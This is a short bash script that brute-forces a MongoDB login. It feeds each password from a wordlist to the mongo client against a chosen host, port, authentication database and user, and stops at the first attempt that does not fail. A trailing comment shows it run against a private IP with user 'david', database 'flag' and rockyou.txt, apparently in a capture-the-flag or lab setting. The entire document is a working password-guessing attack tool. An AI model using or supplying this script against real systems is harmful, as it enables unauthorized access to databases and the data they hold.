#!/bin/bash
while read pwd ; do
nohup mongo --host $1 --port $2 --authenticationDatabase $3 -u $4 -p "$pwd" > response.out 2> /dev/null &
sleep .5
response=$(cat response.out  | grep -w 'Error: Authentication failed' | cut -d ']' -f 2 )
echo "Trying password $pwd  and response is $response "
if [[ "$response" = " Error: Authentication failed. :" ]] ; then
continue
else
echo "found : $uname $pwd"
break;
fi
rm -f response.out
done < $5

## ./flag.sh 192.92.168.3 27017 'flag' 'david' '/usr/share/wordlists/rockyou.txt'